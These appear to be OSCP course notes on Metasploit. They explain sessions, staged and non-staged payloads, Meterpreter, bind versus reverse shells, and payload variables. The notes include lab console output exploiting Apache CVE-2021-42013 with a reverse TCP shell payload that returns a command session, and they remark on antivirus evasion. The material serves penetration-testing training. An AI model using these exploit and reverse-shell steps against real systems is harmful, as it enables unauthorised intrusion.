# Metasploit — Exploits, Sessions & Payloads

> **Track:** Mastering OSCP
> **Section:** Metasploit — 002
> **Topics:** Exploit Modules, Sessions & Jobs, Staged vs. Non-Staged Payloads, Meterpreter, Bind vs. Reverse Shells, Global Variables

---

## 1. Exploit Modules

Having covered auxiliary modules, the real core of Metasploit is **exploit modules** — code targeting vulnerable applications and services directly. At the time of writing, Metasploit contains over **2,200 exploits**, each developed and tested to reliably compromise a wide range of vulnerable services. They're invoked using the same workflow as auxiliary modules (`use`, `set`, `run`).

---

## 2. Sessions & Jobs

- **Sessions** are used to interact with and manage access to a successfully exploited target.
- **Jobs** run modules or features in the background.

When an exploit is launched with `run`, a **session** is created, giving an interactive shell.

### Backgrounding a Session

Press **`Ctrl+Z`** and confirm the prompt:

```
Background session 2? [y/N] y
```

### Listing Active Sessions

```
msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -l
```

```
Active sessions
===============
Id  Name   Type        Information                                          Connection
2   shell  x64/linux                                                        192.168.119.4:4444 -> 192.168.50.16:35534 (192.168.50.16)
```

### Re-Interacting with a Session

```
msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 2
[*] Starting interaction with 2...

uname -a
Linux c1dbace7bab7 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

### Killing a Session

```
sessions -k <session_id>
```

> Alternative workflow: instead of running an exploit and manually backgrounding the resulting session, `run -j` launches it directly as a background **job** — the exploit's output is still visible, but you'll need to actively re-interact with the resulting session to use it.

---

## 3. Staged vs. Non-Staged Payloads

| Type | Description | Trade-off |
|---|---|---|
| **Non-Staged** | Sent in its entirety, bundled with the exploit — contains the exploit and the full shellcode for the selected task | More stable overall, but noticeably larger in size |
| **Staged** | Sent in two parts: a small primary payload connects back to the attacker first, then downloads and executes a larger secondary payload containing the rest of the shellcode | Smaller initial footprint — useful under space constraints, and can help evade antivirus, since the full shellcode is only assembled and injected into memory *after* the initial connection |

**Example — launching a staged payload:**

```
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 15
payload => linux/x64/shell/reverse_tcp

msf6 exploit(multi/http/apache_normalize_path_rce) > run
```

```
[*] Started reverse TCP handler on 192.168.119.4:4444
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[*] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.50.16:80 - Sending linux/x64/shell/reverse_tcp command payload
[*] Sending stage (38 bytes) to 192.168.50.16
[*] Command shell session 3 opened (192.168.119.4:4444 -> 192.168.50.16:35536) at 2022-08-08 05:18:36 -0400

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

---

## 4. The Meterpreter Payload

Exploit frameworks often include advanced payloads offering file transfers, pivoting, and other rich interaction features. Metasploit's flagship in this space is **Meterpreter** — a multi-function payload that:

- Can be **dynamically extended at runtime**.
- Resides **entirely in memory** on the target (no disk artifact).
- Has its communication **encrypted by default**.
- Is especially useful during **post-exploitation**.
- Exists for Windows, Linux, macOS, Android, and more.

---

## 5. Bind Shell vs. Reverse Shell

### Bind Shell

**How it works:** the target system **listens** for an incoming connection from the attacker.

**Process:**
1. The attacker sends a bind shell payload to the target.
2. The payload runs on the target and opens a port (e.g., 4444).
3. The attacker connects to that port using a tool like Netcat or Metasploit.

| Advantages | Disadvantages |
|---|---|
| Easier to set up when the attacker has limited ability to connect directly out | Requires the target's firewall/network to allow **inbound** connections — often blocked in secured environments |
| — | More likely to trigger IDS due to an unusual open listening port on the target |

### Reverse Shell

**How it works:** the attacker's machine **listens**, and the target initiates the connection back to it.

**Process:**
1. The attacker sets up a listener (Metasploit or Netcat).
2. The reverse shell payload runs on the target and establishes an **outbound** connection to the attacker.
3. The attacker gains control through that established connection.

| Advantages | Disadvantages |
|---|---|
| Bypasses most firewalls and NAT, since outbound connections are typically allowed | The attacker's machine must be reachable (public IP, or same network) to receive the connection |
| Less suspicious — mimics legitimate outbound traffic | — |

> This is exactly why reverse shells are the default choice in most real-world engagements: they route around the exact restriction (blocked inbound traffic) that makes bind shells impractical.

---

## 6. Key Payload Variables

| Variable | Purpose |
|---|---|
| `LHOST` | The attacker's own IP address |
| `LPORT` | The port on the attacker's machine used to receive the reverse connection |
| `RHOST` | The target system's IP address |
| `RHOSTS` | IP address(es) of multiple targets or an entire network range |
| `RPORT` | The port being targeted on the target system |

---

## 7. `set` vs. `setg`

| Command | Scope |
|---|---|
| `set` | Temporary — applies only to the **current module** you're working in |
| `setg` | Global — applies across **every module** for the rest of the current Metasploit session |

> `setg` is worth using for values that stay constant across an entire engagement — like `LHOST` — so you don't have to re-type it every time you switch modules.

---

## Summary

Together with the fundamentals covered in the previous part, this completes the core Metasploit workflow: scan and populate the database → find and configure the right auxiliary/exploit module → choose an appropriate payload (staged vs. non-staged, bind vs. reverse) → manage the resulting session → and, where applicable, escalate into a full Meterpreter session for deeper post-exploitation work.
